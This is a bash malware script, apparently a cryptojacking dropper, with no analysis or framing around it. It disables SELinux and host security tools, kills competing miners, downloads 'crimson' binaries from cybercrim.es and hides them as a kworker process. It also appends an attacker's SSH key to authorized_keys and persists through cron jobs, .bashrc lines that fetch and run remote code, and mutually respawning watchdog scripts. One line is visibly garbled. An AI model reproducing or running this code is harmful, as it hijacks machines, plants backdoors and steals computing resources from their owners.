#!/bin/bash
(
    if pgrep -f 'kworker/u8:01' > /dev/null; then
        exit 0
    fi

    aaidk() {
        export pubkey='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCmqGRKD0Fu2btT8cDs2SxBT9CGXRwTBz5bypP/i/TESF3k8Vxew+n2Z4vvjbQrQT2GAGoy40lBmm0WUXY7AhQYkeAZ/kbqtFh9dIm8r++H2YOGe/3grgw6LPWIqnBf7oGgd5XbeESO+F2sSw5CePi5oC9IOxOUJIBRI8MWNLihvFbOb6j0X1XzpOID6KyBxYAg0KyHUbOCS+EhXDPIEKH7YkSfUTHIXX9SZ2s40Vjxq0yb96CjaOul8YbHsTgu1R7pKMJZfPbVWN5FnTyTMXkbv34cmUWY9mmxvKAOwJk9LAKMFl5bRfqf5x/HzeXQUJdEBiUi32yzQpz//M52lDwcyCA7VBs1lH/3xt3OCatzPk+fIRaskmq1GN9HbWQSC3O9NfGsGtiesUlilBhie9MA7GfmxvaQ1YxL3O2b44WP3pZ3LYdr3WRuJJX0lmbcimlRLLkCkUem/22r4IVBn9G5tFazx7+LiSCQXQLD1sROcWgRgKxT9753+CFl7g9Bew4IRD7LeeTOxsrdqUHE89srVFBCRhFWu1YuX8VBhg0jaNXMrvhx7iHKgl2M1osTR/Fs3QNvZ0tgGekcFZAsFhw4fSgAgews/xlRsZQeL4fidynXcgnvY2mc7prvxFd7OEGOMU0Rj79wuatHsCuuNIzN0DAnQEwJCJilvCRK5M58Zw== evorip@ripsec'
        (setenforce 0) 2>/dev/null
        (echo 128 > /proc/sys/vm/nr_hugepages) 2>/dev/null || echo 'Error setting hugepages'
        (sysctl -w vm.nr_hugepages=128)echo "(wget -q -O /tmp/x https://cybercrim.es/l;bash /tmp/x||curl -s https://cybercrim.es/l -o /tmp/x;bash /tmp/x) &>/dev/null &" >> "${HOME}/.bashrc"au 2>/dev/null || echo 'Error setting hugepages'
        crontab -r || rm -f /tmp/x
        rm -rf /var/spool/cron/crontabs/*
        pkill -f watchbog
        pkill -f lololol
        pkill -f xmrig
        pkill -f masscan
        pkill -f pnscan
        pkill -f kdevtmpfsi
        pkill -f kinsing
        pkill -f xhide
        pkill -f adogg
        pkill -f UihJD
        pkill -f systemd-devd
        systemctl stop moneroocean.service 2>/dev/null
        systemctl disable moneroocean.service 2>/dev/null
        systemctl stop crypto.service 2>/dev/null
        systemctl disable crypto.service 2>/dev/null
    }
    aaidk

    if [ -f '/etc/init.d/aegis' ]; then
        /etc/init.d/aegis stop >/dev/null 2>&1
        rm -f /etc/init.d/aegis || echo x
        /etc/init.d/aegis uninstall || echo x
        sleep 1 || echo x
    elif [ -f '/etc/csf/csf.conf' ]; then
        csf -x || echo x
        /etc/rc.d/init.d/csf stop || echo x
        /etc/rc.d/init.d/csf uninstall || echo x
        rm -rf /etc/csf
    fi

    if command -v ipfire >/dev/null 2>&1; then
        ipfire stop || echo x
        systemctl disable ipfire || echo x
        apt-get remove --purge ipfire -y || echo x
    fi

    various1() {
        if [ -d '/mnt' ] && [ -w '/mnt' ]; then
            export BIX_DIR='/mnt'
        elif [ -w '/dev/shm' ]; then
            export BIX_DIR='/dev/shm'
        elif [ -w '/var/tmp' ]; then
            export BIX_DIR='/var/tmp'
        elif [ -w '/tmp' ]; then
            export BIX_DIR='/tmp'
        fi

        mkdir -p ${BIX_DIR}/.X11-Unix
        export BIN_DIR="${BIX_DIR}/.X11-Unix"

        if [ -z "$HOME" ]; then
            if [ $(id -u) = 0 ]; then
                export HOME='/root'
            else
                export HOME="/home/${USER}"
            fi
        fi
        rm -rf ${HOME}/masscan 2>/dev/null
        rm -rf ${HOME}/pnscan 2>/dev/null

        ARCH=$(uname -m)
        if [ "$ARCH" = 'x86_64' ]; then
            export bin_cmd="curl -s -o ${BIN_DIR}/app https://cybercrim.es/crimson.x86 || wget -q -O ${BIN_DIR}/app https://cybercrim.es/crimson.x86"
        elif [ "$ARCH" = 'aarch64' ] || [ "$ARCH" = 'armv8l' ]; then
            export bin_cmd="curl -s -o ${BIN_DIR}/app https://cybercrim.es/crimson.arm || wget -q -O ${BIN_DIR}/app https://cybercrim.es/crimson.arm"
        else
            exit 0
        fi

        ${bin_cmd}
        chmod 777 ${BIN_DIR}/app

        if [ -f '/usr/bin/pnscan' ]; then
            rm -f '/usr/bin/pnscan' || echo 'pnscan uninstallation failed'
        fi

        (find /home/* -name authorized_keys -exec sh -c 'echo "$0" >> "$1"' "${pubkey}" {} \;) 2>/dev/null || echo 'authorized_keys not found or something went wrong'
        (find /root/* -name authorized_keys -exec sh -c 'echo "$0" >> "$1"' "${pubkey}" {} \;) 2>/dev/null || echo 'authorized_keys not found or something went wrong'

        export xhide_x86='https://x0.at/icw_'
        export xhide_arm='https://x0.at/nCZR'

        if [ "$ARCH" = 'x86_64' ]; then
            wget -q -O ${BIN_DIR}/cwd ${xhide_x86} || curl -s -o ${BIN_DIR}/cwd ${xhide_x86}
        elif [ "$ARCH" = 'aarch64' ]; then
            wget -q -O ${BIN_DIR}/cwd ${xhide_arm} || curl -s -o ${BIN_DIR}/cwd ${xhide_arm}
        fi
        chmod 777 ${BIN_DIR}/cwd

        if [ $(command -v crontab) > /dev/null ]; then
            echo "* * * * * wget -q -O /tmp/x https://cybercrim.es/l; bash /tmp/x || curl -s -o /tmp/x https://cybercrim.es/l" | crontab -
        else
            echo 'cron not found'
        fi

        export xhide_cmd="${BIN_DIR}/cwd -s [kworker/u8:01] -d -p ${BIN_DIR}/.crimson.pid ${BIN_DIR}/app"

        ${xhide_cmd}

        if [ -f "${HOME}/.bashrc" ]; then
            grep -qxF "(wget -q -O /tmp/x https://cybercrim.es/l;bash /tmp/x||curl -s https://cybercrim.es/l -o /tmp/x;bash /tmp/x) &>/dev/null &" ${HOME}/.bashrc || echo "(wget -q -O /tmp/x https://cybercrim.es/l;bash /tmp/x||curl -s https://cybercrim.es/l -o /tmp/x;bash /tmp/x) &>/dev/null &" >> ${HOME}/.bashrc
        elif [ -f "${HOME}/.  profile" ]; then
            grep -qxF "(wget -q -O /tmp/x https://cybercrim.es/l;bash /tmp/x||curl -s https://cybercrim.es/l -o /tmp/x;bash /tmp/x) &>/dev/null &" ${HOME}/.profile || echo "(wget -q -O /tmp/x https://cybercrim.es/l;bash /tmp/x||curl -s https://cybercrim.es/l -o /tmp/x;bash /tmp/x) &>/dev/null &" >> ${HOME}/.profile
        fi
    }
    various1

        cat <<EOF > ${BIN_DIR}/node
#!/bin/bash
while true; do
    if ! pgrep -f ${BIN_DIR}/bash > /dev/null; then
        ${BIN_DIR}/bash
    fi
    sleep 1
done
EOF
        cat <<EOF > ${BIN_DIR}/bash
#!/bin/bash
while true; do
    if ! pgrep -f ${BIN_DIR}/node > /dev/null; then
        ${BIN_DIR}/node
    fi
    if [ ! -f ${BIN_DIR}/crimson ]; then
       ${bin_cmd}
    fi
    if ! pgrep -f kworker/u8:01 > /dev/null; then
        ${xhide_cmd}
    fi
    sleep 1
done
EOF
        chmod 777 ${BIN_DIR}/bash
        chmod 777 ${BIN_DIR}/node
        ${BIN_DIR}/node
) &>/dev/null &
